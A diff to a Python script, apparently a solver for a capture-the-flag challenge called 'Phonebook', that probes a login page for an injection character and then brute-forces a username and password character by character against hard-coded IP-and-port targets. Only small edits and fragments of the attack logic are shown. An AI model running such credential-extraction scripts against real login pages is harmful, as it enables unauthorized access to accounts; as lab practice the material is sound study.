@@ -1,5 +1,7 @@
 #!/usr/bin/python3
 
+# Phonebook
+
 # Description: Finding SQLi character --> Find a username --> Find a password
 
 import requests
@@ -23,7 +25,7 @@ def sqlFind(url, page_login, specials):
             pass
         else:
             print(f"[INFO] SQLi char: {i}")
-            results += i
+            results = i
             break
     
     return i
@@ -59,7 +61,7 @@ def findUsername(url, page_login, sql_char, specials):
     return username_found
 
 def findPassword(url, page_login, sql_char, sql_username, specials):
-    specials.remove(sql_char)
+    #specials.remove(sql_char)
     specials_join = ''.join(specials)
 
     password_found = ""
@@ -87,7 +89,7 @@ def findPassword(url, page_login, sql_char, sql_username, specials):
                 pass
 
 if __name__ == '__main__':
-    url = "http://167.71.131.167:31690/" 
+    url = "http://206.189.26.62:32244/" 
     page_login = "login"
     
     specials = ['~','!','@','#','*','$','%','^','&','(',')','-','_','+','=','{','}',']','[','|','\\','`',',','.','/','?',';',':',"'",'"','<','>']
